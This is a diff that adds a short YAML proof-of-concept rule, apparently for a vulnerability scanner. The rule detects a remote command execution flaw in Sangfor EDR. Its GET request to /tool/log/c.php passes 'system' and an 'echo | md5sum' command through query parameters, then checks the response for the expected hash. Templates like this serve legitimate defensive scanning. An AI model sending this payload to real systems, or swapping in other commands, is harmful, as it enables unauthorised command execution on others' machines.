@@ -1,0 +1,13 @@
+name: poc-yaml-sangfor-edr-rce
+set:
+  r: randomInt(2000000000, 2100000000)
+rules:
+  - method: GET
+    path: "/tool/log/c.php?strip_slashes=system&host=echo%20-n%20{{r}}|md5sum"
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
+detail:
+  author: cookie
+  links:
+    - https://www.cnblogs.com/limanman233/p/13520066.html
